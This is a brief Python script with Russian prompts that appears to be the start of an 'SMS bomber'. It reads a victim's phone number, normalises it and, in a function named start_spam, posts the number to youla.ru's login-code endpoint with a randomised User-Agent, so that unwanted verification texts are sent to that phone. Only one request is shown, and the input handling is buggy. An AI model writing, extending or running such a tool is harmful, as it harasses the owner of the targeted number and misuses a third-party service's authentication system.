import user_agent
import requests 
from time import sleep
import random


    
def main():
    print('Введите телефончик')
    phone = parse_phone(input('>> '))
    print()

    print('Номер: ' + beaty_phone(phone))
    print('1, 2, 3...')

    start_spam(phone)


def beaty_phone(phone):
    return phone[0] + '(' + phone[1:4] + ')' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]


def parse_phone(phone):
    if phone in ('', ' '):
        main()

    if len(phone) in [10, 11, 12]:
        if phone[0] == '+':
            phone = phone[1:]
        elif phone[0] == '8':
            phone = '7' + phone[1:]
        elif phone[0] == '9':
            phone = '7' + phone
        
        return phone

    else:
        print('[-] Номер введён неверно :/')
        sleep(1)
        main()


def start_spam(phone):
    
    
    def format_phone(phone, phone_mask):
        phone_list = list(phone)
        for i in phone_list:
            phone_mask = phone_mask.replace('#', i, 1)

        return phone_mask



    name = ''

    headers = {'User-Agent': user_agent.generate_user_agent()}

    requests.post('https://youla.ru/web-api/auth/request_code',data={'phone': phone}, headers=headers)






if __name__ == "__main__":
     main()